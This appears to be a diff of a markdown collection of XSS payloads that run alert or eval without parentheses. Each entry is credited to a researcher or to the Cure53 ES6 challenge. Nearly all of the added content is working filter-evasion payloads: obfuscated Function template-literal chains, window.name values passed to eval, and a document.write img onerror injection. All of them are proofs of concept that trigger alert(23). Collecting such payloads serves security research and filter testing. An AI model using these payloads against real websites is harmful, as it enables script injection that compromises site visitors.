@@ -43,6 +43,7 @@ xss.html
     onerror=alert;throw 23;
 
 ---
+
 [Garethheyes](https://twitter.com/garethheyes/status/1128974215682637825)
 
     'alert\x2823\x29'instanceof{[Symbol.hasInstance]:eval}
@@ -53,11 +54,13 @@ Only Chrome [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-w
     onerror=eval;throw'=alert\x2823\x29';
     
 ---
+
 [Garethheyes](https://twitter.com/garethheyes/status/1126526480614416395)
 
     {onerror=alert}throw 23
 
 ----
+
 [terjanq](https://twitter.com/terjanq/status/1126614389371621378)
 
 xss_redir.html
@@ -87,6 +90,85 @@ xss.html
     Function`a${name}```
     
 ---
+
+[terjanq](https://twitter.com/terjanq/status/1239617536318152704?s=20)
+
+    
+    example.com/xss?%0aalert(/23/)//
+    
+
+    Function`a${unescape. call`${location}`}```
+    
+---
+
+[BitK](https://twitter.com/BitK_/status/1239581718635479041)
+
+    Function`a${`alert${Function`a${`return fromCharCode`}{fromCharCode}``${String}``40`}23${Function`a${`return fromCharCode`}{fromCharCode}``${String}``41`}`}```
+    
+--- 
+
+[BitK](https://twitter.com/BitK_/status/1239620001776185344?)
+
+    Function`a${`${Function`a${`return from`}{from}``${Array}``96${Function`a${`return fromCharCode`}{fromCharCode}``${String}`}`}${Function`a${`return fromCharCode`}{fromCharCode}``${String}``${96}${10}${97}${108}${101}${114}${116}${40}${50}${51}${41}`}`}```
+
+    
+--- 
+
+
+[albinowax](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)
+
+    window.name="alert(23)"
+    location="xss.html"
+    
+xss.html
+
+    eval.constructor`eval\x28name\x29```
+    
+--- 
+
+[hasegawayosuke](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)
+
+    window.name="alert(23)"
+    location="xss.html"
+    
+xss.html
+
+    [].every.call`eval\x28name\x29${eval}`
+    
+---
+
+[iwasakinoriaki](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)
+
+    window.name="alert(23)"
+    location="xss.html"
+    
+xss.html
+
+    eval.call`${top.name}`
+    
+---
+
+[Cure53](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)
+
+    window.name="<img src=x onerror=alert(23)>"
+    location="xss.html"
+    
+xss.html
+
+    document.write`${top.name}`
+    
+---
+
+[mage_1868 ](https://github.com/cure53/XSSChallengeWiki/wiki/ES6-Challenge)
+
+    location="https://example.com/xss.html/.source;alert(23)?xss="
+    
+example.com
+
+    eval.call`${location.pathname}`
+    
+---
+
 Only Firefox [Garethheyes](https://twitter.com/garethheyes/status/1126922526796468224)
           
     {onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:'',message:'alert\x2823\x29'}
